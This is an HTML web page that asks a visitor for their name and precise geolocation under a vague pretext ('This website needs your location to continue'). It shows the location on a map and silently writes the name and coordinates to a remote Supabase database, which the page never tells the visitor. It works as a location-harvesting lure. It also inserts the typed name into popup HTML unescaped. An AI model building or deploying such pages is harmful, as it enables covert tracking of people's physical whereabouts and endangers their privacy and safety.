<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location Access</title>

  <!-- Leaflet CSS -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px 20px;
      background: #f5f5f5;
    }

    .box {
      max-width: 400px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0,0,0,.1);
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }

    #allow {
      background: #007aff;
      color: white;
    }

    #deny {
      background: #ddd;
      color: #222;
    }

    #result {
      margin-top: 25px;
      word-break: break-word;
    }

    #map {
      height: 350px;
      width: 100%;
      margin-top: 25px;
      border-radius: 15px;
      display: none; /* هەتا شوێن وەرنەگیرێت شاراوەیە */
    }
  </style>
</head>

<body>

  <div class="box">
    <h2>Location Access</h2>
    <p>This website needs your location to continue.</p>

    <button id="allow">Allow</button>
    <button id="deny">Not Allow</button>

    <div id="result"></div>
    <div id="map"></div>
  </div>

  <!-- Leaflet & Supabase JS -->
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const allowButton = document.getElementById("allow");
    const denyButton = document.getElementById("deny");
    const result = document.getElementById("result");
    const mapDiv = document.getElementById("map");

    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";

    let supabase = null;
    try {
      if (window.supabase && typeof window.supabase.createClient === 'function') {
        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
      }
    } catch (e) {
      console.error("Supabase init error:", e);
    }

    let mapInstance = null;

    allowButton.addEventListener("click", () => {
      const name = prompt("Enter your name:");

      if (!name || !name.trim()) {
        result.innerHTML = "Please enter your name.";
        return;
      }

      if (!navigator.geolocation) {
        result.innerHTML = "Geolocation is not supported by your browser.";
        return;
      }

      result.innerHTML = "Requesting your location...";

      navigator.geolocation.getCurrentPosition(
        async function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          // ١. پێشاندانی دیڤی نەخشەکە
          mapDiv.style.display = "block";

          // ٢. ئەگەر نەخشە پێشتر دروستکرابوو پاکیبکەرەوە
          if (mapInstance) {
            mapInstance.remove();
          }

          // ٣. دروستکردنەوەی نەخشەکە
          mapInstance = L.map("map").setView([latitude, longitude], 16);

          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
            maxZoom: 19,
            attribution: "&copy; OpenStreetMap contributors"
          }).addTo(mapInstance);

          // ٤. چاککردنی وێنەی ئایکۆنی نیشانەکە (Marker)
          const defaultIcon = L.icon({
            iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
            shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
            iconSize: [25, 41],
            iconAnchor: [12, 41],
            popupAnchor: [1, -34],
            shadowSize: [41, 41]
          });

          L.marker([latitude, longitude], { icon: defaultIcon })
            .addTo(mapInstance)
            .bindPopup(`<b>${name.trim()}</b><br>Your current location`)
            .openPopup();

          // ٥. ڕێکخستنی قەبارەی نەخشەکە دوای دیاریکردنی `display: block`
          setTimeout(() => {
            mapInstance.invalidateSize();
          }, 200);

          // ٦. ناردنی زانیارییەکان بۆ Supabase
          if (supabase) {
            const { error } = await supabase
              .from("locations")
              .insert([{ name: name.trim(), latitude, longitude }]);

            if (error) {
              console.error("Supabase Error:", error);
            }
          }

          result.innerHTML = `
            <h3>Location received ✅</h3>
            <p>Your location has been received successfully.</p>
          `;
        },
        function(error) {
          if (error.code === 1) {
            result.innerHTML = "Location permission was denied.";
          } else if (error.code === 2) {
            result.innerHTML = "Location is unavailable.";
          } else if (error.code === 3) {
            result.innerHTML = "Location request timed out.";
          } else {
            result.innerHTML = "Could not get your location.";
          }
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    });

    denyButton.addEventListener("click", () => {
      result.innerHTML = "Location access was not allowed.";
      mapDiv.style.display = "none";
    });
  </script>

</body>
</html>
